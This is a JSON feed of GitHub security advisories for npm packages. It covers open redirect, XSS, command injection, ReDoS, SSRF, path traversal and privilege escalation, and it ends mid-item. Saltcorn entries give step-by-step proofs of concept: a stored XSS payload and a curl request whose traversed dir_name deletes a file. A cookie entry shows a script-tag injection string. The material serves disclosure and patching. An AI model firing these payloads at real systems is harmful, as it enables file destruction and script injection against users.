{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>URL Redirection to Untrusted Site ('Open Redirect') vulnerability in Express. This vulnerability affects the use of the Express Response object. This issue impacts Express: from 3.4.5 before 4.0.0-rc1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9266\">https://nvd.nist.gov/vuln/detail/CVE-2024-9266</a></li>\n<li><a href=\"https://www.herodevs.com/vulnerability-directory/cve-2024-9266\">https://www.herodevs.com/vulnerability-directory/cve-2024-9266</a></li>\n<li><a href=\"https://github.com/expressjs/express/compare/3.4.4...3.4.5\">https://github.com/expressjs/express/compare/3.4.4...3.4.5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj78-5fmv-mv28\">https://github.com/advisories/GHSA-jj78-5fmv-mv28</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj78-5fmv-mv28",
            "title": "[express] Express Open Redirect vulnerability",
            "date_modified": "2024-10-09T23:46:56.000Z",
            "date_published": "2024-10-03T21:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj78-5fmv-mv28"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability classified as problematic has been found in RelaxedJS ReLaXed up to 0.2.2. Affected is an unknown function of the component Pug to PDF Converter. The manipulation leads to cross site scripting. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9283\">https://nvd.nist.gov/vuln/detail/CVE-2024-9283</a></li>\n<li><a href=\"https://drive.google.com/file/d/1Ll1dRwQds8987S-l5o2iJu4MQRG-p4-A/view?usp=sharing\">https://drive.google.com/file/d/1Ll1dRwQds8987S-l5o2iJu4MQRG-p4-A/view?usp=sharing</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.278676\">https://vuldb.com/?ctiid.278676</a></li>\n<li><a href=\"https://vuldb.com/?id.278676\">https://vuldb.com/?id.278676</a></li>\n<li><a href=\"https://vuldb.com/?submit.411185\">https://vuldb.com/?submit.411185</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gj3p-j74v-3x57\">https://github.com/advisories/GHSA-gj3p-j74v-3x57</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gj3p-j74v-3x57",
            "title": "[relaxedjs] ReLaXed Cross-site Scripting vulnerability",
            "date_modified": "2024-10-08T18:56:11.000Z",
            "date_published": "2024-09-27T15:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gj3p-j74v-3x57"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Slim Select 2.0 versions through 2.9.0 are affected by a potential cross-site scripting vulnerability. In select.ts:createOption(), the text variable from the user-provided Options object is assigned to an innerHTML without sanitation. Software that depends on this library to dynamically generate lists using unsanitized user-provided input may be vulnerable to cross-site scripting, resulting in attacker executed JavaScript. At this time, no patch is available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9440\">https://nvd.nist.gov/vuln/detail/CVE-2024-9440</a></li>\n<li><a href=\"https://github.com/brianvoe/slim-select/issues/564\">https://github.com/brianvoe/slim-select/issues/564</a></li>\n<li><a href=\"https://github.com/brianvoe/slim-select/blob/e7e37e2ff90e125f846bd98d6b8f278524ead79e/src/slim-select/select.ts#L377\">https://github.com/brianvoe/slim-select/blob/e7e37e2ff90e125f846bd98d6b8f278524ead79e/src/slim-select/select.ts#L377</a></li>\n<li><a href=\"https://vulncheck.com/advisories/slim-select-xss\">https://vulncheck.com/advisories/slim-select-xss</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qvqv-mcxr-x8qw\">https://github.com/advisories/GHSA-qvqv-mcxr-x8qw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qvqv-mcxr-x8qw",
            "title": "[slim-select] Slim Select has potential Cross-site Scripting issue",
            "date_modified": "2024-10-08T18:50:10.000Z",
            "date_published": "2024-10-02T21:30:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qvqv-mcxr-x8qw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>All versions of the package ggit are vulnerable to Arbitrary Argument Injection via the clone() API, which allows specifying the remote URL to clone and the file on disk to clone to. The library does not sanitize for user input or validate a given URL scheme, nor does it properly pass command-line flags to the git binary using the double-dash POSIX characters (--) to communicate the end of options.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21533\">https://nvd.nist.gov/vuln/detail/CVE-2024-21533</a></li>\n<li><a href=\"https://gist.github.com/lirantal/80c6d59ac1b682a32bc9d2ff92044bb9\">https://gist.github.com/lirantal/80c6d59ac1b682a32bc9d2ff92044bb9</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-GGIT-5731319\">https://security.snyk.io/vuln/SNYK-JS-GGIT-5731319</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pr45-cg4x-ff4m\">https://github.com/advisories/GHSA-pr45-cg4x-ff4m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pr45-cg4x-ff4m",
            "title": "[ggit] ggit is vulnerable to Arbitrary Argument Injection via the clone() API",
            "date_modified": "2024-10-08T14:38:54.000Z",
            "date_published": "2024-10-08T06:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pr45-cg4x-ff4m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>All versions of the package ggit are vulnerable to Command Injection via the fetchTags(branch) API, which allows user input to specify the branch to be fetched and then concatenates this string along with a git command which is then passed to the unsafe exec() Node.js child process API.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21532\">https://nvd.nist.gov/vuln/detail/CVE-2024-21532</a></li>\n<li><a href=\"https://gist.github.com/lirantal/d8f87b366d2078e6118ab7bf2b005f02\">https://gist.github.com/lirantal/d8f87b366d2078e6118ab7bf2b005f02</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-GGIT-5731320\">https://security.snyk.io/vuln/SNYK-JS-GGIT-5731320</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-62cx-5xj4-wfm4\">https://github.com/advisories/GHSA-62cx-5xj4-wfm4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-62cx-5xj4-wfm4",
            "title": "[ggit] ggit is vulnerable to Command Injection via the fetchTags(branch) API",
            "date_modified": "2024-10-08T14:38:50.000Z",
            "date_published": "2024-10-08T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-62cx-5xj4-wfm4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The SAP HANA Node.js client package versions from 2.0.0 before 2.21.31 is impacted by Prototype Pollution vulnerability allowing an attacker to add arbitrary properties to global object prototypes. This is due to improper user input sanitation when using the nestTables feature causing low impact on the availability of the application. This has no impact on Confidentiality and Integrity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45277\">https://nvd.nist.gov/vuln/detail/CVE-2024-45277</a></li>\n<li><a href=\"https://me.sap.com/notes/3520100\">https://me.sap.com/notes/3520100</a></li>\n<li><a href=\"https://url.sap/sapsecuritypatchday\">https://url.sap/sapsecuritypatchday</a></li>\n<li><a href=\"https://www.npmjs.com/package/@sap/hana-client?activeTab=code\">https://www.npmjs.com/package/@sap/hana-client?activeTab=code</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6339-gv7w-g5f4\">https://github.com/advisories/GHSA-6339-gv7w-g5f4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6339-gv7w-g5f4",
            "title": "[@sap/hana-client] SAP HANA Node.js client package vulnerable to Prototype Pollution",
            "date_modified": "2024-10-08T14:37:56.000Z",
            "date_published": "2024-10-08T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6339-gv7w-g5f4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A bad regular expression is generated any time you have two parameters within a single segment, when adding a <code>-</code> at the end, like <code>/:a-:b-</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update to find-my-way v8.2.2 or v9.0.1. or subsequent versions.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No known workarounds.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/advisories/GHSA-9wv6-86v2-598j\">CVE-2024-45296</a></li>\n<li><a href=\"https://blakeembrey.com/posts/2024-09-web-redos/\">Detailed blog post about <code>path-to-regexp</code> vulnerability</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6\">https://github.com/delvedor/find-my-way/security/advisories/GHSA-rrr8-f88r-h8q6</a></li>\n<li><a href=\"https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518\">https://github.com/delvedor/find-my-way/commit/17fae694dcefc056045da201681c1530f0f80518</a></li>\n<li><a href=\"https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440\">https://github.com/delvedor/find-my-way/commit/5e9e0eb5d8d438e06a185d5e536a896572dd0440</a></li>\n<li><a href=\"https://blakeembrey.com/posts/2024-09-web-redos\">https://blakeembrey.com/posts/2024-09-web-redos</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9wv6-86v2-598j\">https://github.com/advisories/GHSA-9wv6-86v2-598j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45813\">https://nvd.nist.gov/vuln/detail/CVE-2024-45813</a></li>\n<li><a href=\"https://github.com/delvedor/find-my-way/commit/66fa03923355b8da1db4ba572d66a4fee4a57cf5\">https://github.com/delvedor/find-my-way/commit/66fa03923355b8da1db4ba572d66a4fee4a57cf5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rrr8-f88r-h8q6\">https://github.com/advisories/GHSA-rrr8-f88r-h8q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rrr8-f88r-h8q6",
            "title": "[find-my-way] find-my-way has a ReDoS vulnerability in multiparametric routes",
            "date_modified": "2024-10-07T21:52:23.000Z",
            "date_published": "2024-09-18T15:52:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rrr8-f88r-h8q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Event log data is not properly sanitized leading to stored Cross-Site Scripting (XSS) vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445</a></li>\n</ul>\n<pre><code class=\"language-js\">router.get(\n  \"/:id\",\n  isAdmin,\n  error_catcher(async (req, res) =&gt; {\n    const { id } = req.params;\n    const ev = await EventLog.findOneWithUser(id);\n    send_events_page({\n      [...]\n      contents: {\n        type: \"card\",\n        contents:\n          [...]\n          ) +\n          div(\n            { class: \"eventpayload\" },\n            ev.payload ? pre(JSON.stringify(ev.payload, null, 2)) : \"\" //&lt;---\n          ),\n      },\n    });\n  })\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>The following PoC demonstrates how a non-admin user with permission to read/write on a table can inject malicious javascript code that will be executed in the event log admin panel if event logs are enabled.</p>\n<p>To demonstrate this issue, we need to prepare some components. The following steps should be executed with an admin user.</p>\n<ol>\n<li>create a table with one column of type string set read/write permission to staff users (just as an example)</li>\n</ol>\n<ul>\n<li>visit <code>http://localhost:3000/table/new</code></li>\n<li>create a table with <code>Table name</code> <code>my_table_xss</code> and click <code>Create</code></li>\n<li>click <code>Add field</code> to add a field with <code>Label</code> called <code>payload</code> of type <code>String</code> and click <code>Next &gt;&gt;</code></li>\n<li>leave default values for <code>Attributes</code> and click <code>Next &gt;&gt;</code> - it should redirect to <code>http://localhost:3000/table/&lt;table-number&gt;</code></li>\n<li>under <code>Edit table properties</code>, set <code>Minimum role to read</code> and <code>Minimum role to write</code> to <code>staff</code></li>\n</ul>\n<ol start=\"2\">\n<li>create an edit view so that staff users can insert more data</li>\n</ol>\n<ul>\n<li>visit <code>http://localhost:3000/viewedit</code> anc click <code>Create View</code></li>\n<li>set the following values:<ul>\n<li><code>View name</code>: <code>my_xss_view</code></li>\n<li><code>View pattern</code>: <code>Edit</code></li>\n<li><code>Table</code>: <code>my_table_xss</code></li>\n<li><code>Minimum role</code>: <code>staff</code></li>\n</ul>\n</li>\n<li>click <code>Configure &gt;&gt;</code></li>\n<li>on page <code>http://localhost:3000/viewedit/config/my_xss_view</code> click <code>Next &gt;&gt;</code> and then <code>Finish &gt;&gt;</code></li>\n<li>you should see a message <code>View my_xss_view saved</code></li>\n</ul>\n<ol start=\"3\">\n<li>edit the site structure to add the View just created so that <code>staff</code> users can access it</li>\n</ol>\n<ul>\n<li>visit <code>http://localhost:3000/menu</code></li>\n<li>set the following values:<ul>\n<li><code>Type</code>: <code>View</code></li>\n<li><code>View</code>: <code>my_xss_view [Edit]</code></li>\n<li><code>Text label</code>: <code>view</code></li>\n<li><code>Minimum role</code>: <code>staff</code></li>\n</ul>\n</li>\n<li>click <code>Add</code></li>\n</ul>\n<ol start=\"4\">\n<li>create an event that will log when data is inserted in the <code>my_table_xss</code> table create at step 1</li>\n</ol>\n<ul>\n<li>visit <code>http://localhost:3000/eventlog/settings</code></li>\n<li>under <code>Which events should be logged?</code> select:<ul>\n<li><code>[X] Insert</code></li>\n<li><code>[X] Insert my_table_xss</code></li>\n</ul>\n</li>\n</ul>\n<p>Login with a user with staff role (you can do the same steps also with an admin user)</p>\n<ul>\n<li>visit <code>http://localhost:3000/view/my_xss_view</code></li>\n<li>in the <code>payload</code> field insert <code>\"&lt;svg/onload=alert(`xss`)&gt;</code> and click <code>Save</code></li>\n</ul>\n<p>With an admin user inspect the log entry generated by the above action:</p>\n<ul>\n<li>visit <code>http://localhost:3000/eventlog</code></li>\n<li>click on the event log generated (<code>http://localhost:3000/eventlog/&lt;event-number&gt;</code>)</li>\n<li>an alert will appear</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>Stored Cross-Site Scripting (XSS)</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Sanitize the user input before building HTML elements</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-pf56-h9qf-rxq4\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-pf56-h9qf-rxq4</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a\">https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/eventlog.js#L445</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pf56-h9qf-rxq4\">https://github.com/advisories/GHSA-pf56-h9qf-rxq4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pf56-h9qf-rxq4",
            "title": "[@saltcorn/server] Saltcorn Server Stored Cross-Site Scripting (XSS) in event logs page",
            "date_modified": "2024-10-07T15:14:41.000Z",
            "date_published": "2024-10-07T15:14:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pf56-h9qf-rxq4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A logged-in user with any role can delete arbitrary files on the filesystem by calling the <code>sync/clean_sync_dir</code> endpoint. The <code>dir_name</code> POST parameter is not validated/sanitized and is used to construct the <code>syncDir</code> that is deleted by calling <code>fs.rm</code>.</p>\n<h3 id=\"details\">Details</h3>\n<ul>\n<li>file: <a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346</a></li>\n</ul>\n<pre><code class=\"language-js\">router.post(\n  \"/clean_sync_dir\",\n  error_catcher(async (req, res) =&gt; {\n    const { dir_name } = req.body; // [1] source\n    try {\n      const rootFolder = await File.rootFolder();\n      const syncDir = path.join(\n        rootFolder.location,\n        \"mobile_app\",\n        \"sync\",\n        dir_name // [2]\n      );\n      await fs.rm(syncDir, { recursive: true, force: true }); // [3] sink\n      res.status(200).send(\"\");\n    } catch (error) {\n      getState().log(2, `POST /sync/clean_sync_dir: '${error.message}'`);\n      res.status(400).json({ error: error.message || error });\n    }\n  })\n);\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>The following PoC can be executed with a user with any role (<code>admin</code>, <code>staff</code>, <code>user</code>, <code>public</code>)</p>\n<ul>\n<li>create a file in a folder different from where the server is started:</li>\n</ul>\n<pre><code>touch /tmp/secret\ncat /tmp/secret\n</code></pre>\n<ul>\n<li>log with a user and retrieve valid <code>connect.sid</code> and <code>_csrf</code> values***</li>\n<li>send the following <code>curl</code> request</li>\n</ul>\n<pre><code>curl -i -X $'POST' \\\n  -H $'Host: localhost:3000' \\\n  -H $'Content-Type: application/x-www-form-urlencoded' \\\n  -H $'Content-Length: 93' \\\n  -H $'Origin: http://localhost:3000' \\\n  -H $'Connection: close' \\\n  -b $'connect.sid=VALID_CONNECT_SID_COOKIE; loggedin=true' \\\n  --data-binary $'_csrf=VALID_CSRF_VALUE&amp;dir_name=/../../../../../../../../../../tmp/secret' \\\n  $'http://localhost:3000/sync/clean_sync_dir'\n</code></pre>\n<ul>\n<li>check if the file previously created does not exist anymore:</li>\n</ul>\n<pre><code>cat /tmp/secret\ncat: /tmp/secret: No such file or directory\n</code></pre>\n<p>*** obtain <code>connect.sid</code> and <code>_csrf</code> values</p>\n<p>A possible way to retrieve <code>connect.sid</code> and <code>_csrf</code> values is to use the password reset functionality:</p>\n<ul>\n<li>log in</li>\n<li>open the browser developer console, go to the <code>Network</code> tab filter for <code>settings</code> request</li>\n<li>visit <code>http://localhost:3000/auth/settings</code></li>\n<li>trigger the change password functionality</li>\n<li>under the <code>Headers</code> and <code>Request</code> tabs, grab the <code>connect.sid</code> and <code>_csrf</code> values and replace them in the curl command</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary file delete</p>\n<h3 id=\"recommended-mitigation\">Recommended Mitigation</h3>\n<p>Resolve the <code>syncDir</code> and check if it starts with <code>rootFolder.location/mobile_app/sync</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/saltcorn/saltcorn/security/advisories/GHSA-43f3-h63w-p6f6\">https://github.com/saltcorn/saltcorn/security/advisories/GHSA-43f3-h63w-p6f6</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a\">https://github.com/saltcorn/saltcorn/commit/3c551261d0e230635774798009951fa83a07cc3a</a></li>\n<li><a href=\"https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346\">https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47818\">https://nvd.nist.gov/vuln/detail/CVE-2024-47818</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-43f3-h63w-p6f6\">https://github.com/advisories/GHSA-43f3-h63w-p6f6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-43f3-h63w-p6f6",
            "title": "[@saltcorn/server] Saltcorn Server allows logged-in users to delete arbitrary files because of a path traversal vulnerability",
            "date_modified": "2024-10-08T14:19:02.000Z",
            "date_published": "2024-10-07T15:10:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-43f3-h63w-p6f6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Strapi v4.24.4 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /strapi.io/_next/image. This vulnerability allows attackers to scan for open ports or access sensitive information via a crafted GET request.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37818\">https://nvd.nist.gov/vuln/detail/CVE-2024-37818</a></li>\n<li><a href=\"https://medium.com/%40barkadevaibhav491/server-side-request-forgery-in-strapi-e02d5fe218ab\">https://medium.com/%40barkadevaibhav491/server-side-request-forgery-in-strapi-e02d5fe218ab</a></li>\n<li><a href=\"https://strapi.io\">https://strapi.io</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9ff-j98v-p435\">https://github.com/advisories/GHSA-p9ff-j98v-p435</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p9ff-j98v-p435",
            "title": "[@strapi/strapi] Strapi Server-Side Request Forgery (SSRF)",
            "date_modified": "2024-10-04T23:33:30.000Z",
            "date_published": "2024-06-20T21:31:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p9ff-j98v-p435"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, <code>serialize(\"userName=&lt;script&gt;alert('XSS3')&lt;/script&gt;; Max-Age=2592000; a\", value)</code> would result in <code>\"userName=&lt;script&gt;alert('XSS3')&lt;/script&gt;; Max-Age=2592000; a=test\"</code>, setting <code>userName</code> cookie to <code>&lt;script&gt;</code> and ignoring <code>value</code>.</p>\n<p>A similar escape can be used for <code>path</code> and <code>domain</code>, which could be abused to alter other fields of the cookie.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to 0.7.0, which updates the validation for <code>name</code>, <code>path</code>, and <code>domain</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Avoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jshttp/cookie/pull/167\">https://github.com/jshttp/cookie/pull/167</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x\">https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x</a></li>\n<li><a href=\"https://github.com/jshttp/cookie/pull/167\">https://github.com/jshttp/cookie/pull/167</a></li>\n<li><a href=\"https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c\">https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pxg6-pf52-xh8x\">https://github.com/advisories/GHSA-pxg6-pf52-xh8x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
            "title": "[cookie] cookie accepts cookie name, path, and domain with out of bounds characters",
            "date_modified": "2024-10-04T20:31:01.000Z",
            "date_published": "2024-10-04T20:31:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If the Parse Server option <code>allowCustomObjectId: true</code> is set, an attacker that is allowed to create a new user can set a custom object ID for that new user that exploits the vulnerability and acquires privileges of a specific role.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Improved validation for custom user object IDs. Session tokens for existing users with an object ID that exploits the vulnerability are now rejected.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Disable custom object IDs by setting <code>allowCustomObjectId: false</code> or not setting the option which defaults to <code>false</code>.</li>\n<li>Use a Cloud Code Trigger to validate that a new user's object ID doesn't start with the prefix <code>role:</code>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg\">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9317\">https://github.com/parse-community/parse-server/pull/9317</a> (fix for Parse Server 7)</li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9318\">https://github.com/parse-community/parse-server/pull/9318</a> (fix for Parse Server 6)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg\">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47183\">https://nvd.nist.gov/vuln/detail/CVE-2024-47183</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9317\">https://github.com/parse-community/parse-server/pull/9317</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9318\">https://github.com/parse-community/parse-server/pull/9318</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc\">https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f\">https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8xq9-g7ch-35hg\">https://github.com/advisories/GHSA-8xq9-g7ch-35hg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8xq9-g7ch-35hg",
            "title": "[parse-server] Parse Server's custom object ID allows to acquire role privileges",
            "date_modified": "2024-10-04T18:50:57.000Z",
            "date_published": "2024-10-04T18:50:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8xq9-g7ch-35hg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>If the Parse Server option <code>allowCustomObjectId: true</code> is set, an attacker that is allowed to create a new user can set a custom object ID for that new user that exploits the vulnerability and acquires privileges of a specific role.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Improved validation for custom user object IDs. Session tokens for existing users with an object ID that exploits the vulnerability are now rejected.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Disable custom object IDs by setting <code>allowCustomObjectId: false</code> or not setting the option which defaults to <code>false</code>.</li>\n<li>Use a Cloud Code Trigger to validate that a new user's object ID doesn't start with the prefix <code>role:</code>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg\">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9317\">https://github.com/parse-community/parse-server/pull/9317</a> (fix for Parse Server 7)</li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9318\">https://github.com/parse-community/parse-server/pull/9318</a> (fix for Parse Server 6)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg\">https://github.com/parse-community/parse-server/security/advisories/GHSA-8xq9-g7ch-35hg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47183\">https://nvd.nist.gov/vuln/detail/CVE-2024-47183</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9317\">https://github.com/parse-community/parse-server/pull/9317</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/pull/9318\">https://github.com/parse-community/parse-server/pull/9318</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc\">https://github.com/parse-community/parse-server/commit/13ee52f0d19ef3a3524b3d79aea100e587eb3cfc</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f\">https://github.com/parse-community/parse-server/commit/1bfbccf9ee7ea77533b2b2aa7c4c69f3bd35e66f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8xq9-g7ch-35hg\">https://github.com/advisories/GHSA-8xq9-g7ch-35hg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8xq9-g7ch-35hg",
            "title": "[parse-server] Parse Server's custom object ID allows to acquire role privileges",
